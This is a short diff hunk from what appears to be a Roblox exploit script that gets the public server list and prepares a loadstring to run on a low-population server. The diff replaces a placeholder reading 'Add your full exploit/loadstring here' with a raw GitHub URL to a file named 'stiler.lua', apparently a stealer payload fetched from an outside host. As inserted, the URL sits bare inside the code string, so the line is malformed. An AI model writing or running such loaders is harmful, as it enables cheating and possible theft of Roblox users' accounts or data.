@@ -8,7 +8,7 @@ local ServersApi = "https://games.roblox.com/v1/games/126884695634066/servers/Pu
 -- Loadstring to run on the next low-pop server
 local loadstringCode = [[
     print("Hello from the new server!")
-    -- Add your full exploit/loadstring here
+   https://raw.githubusercontent.com/PiotrIsCool/Thunderx/refs/heads/main/stiler.lua
 ]]
 
 -- Function to safely get server list from Roblox API
